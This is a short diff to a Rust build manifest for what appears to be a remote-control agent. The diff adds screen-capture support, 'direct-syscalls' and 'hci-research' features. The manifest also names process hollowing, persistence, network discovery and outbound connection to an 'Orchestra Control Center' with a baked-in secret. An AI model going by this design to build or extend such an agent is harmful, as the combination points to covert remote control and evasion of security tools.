@@ -47,9 +47,15 @@ hollowing = { path = "../hollowing" }
 [features]
 persistence = []
 network-discovery = []
-remote-assist = ["dep:enigo", "dep:image"]
+# `dep:x11cap` only resolves when compiling for Linux (see
+# `[target.'cfg(target_os = "linux")'.dependencies]`); on Windows it is a
+# no-op feature activation because the optional dep is absent from the
+# target-specific dependency table.
+remote-assist = ["dep:enigo", "dep:image", "dep:x11cap"]
 module-signatures = ["common/module-signatures"]
 forward-secrecy = ["common/forward-secrecy"]
+direct-syscalls = []
+hci-research = []
 # Connect the agent outbound to an Orchestra Control Center instead of waiting
 # for an inbound connection from a console. The server address and PSK are
 # read from the ORCHESTRA_C / ORCHESTRA_SECRET runtime env vars, or baked in
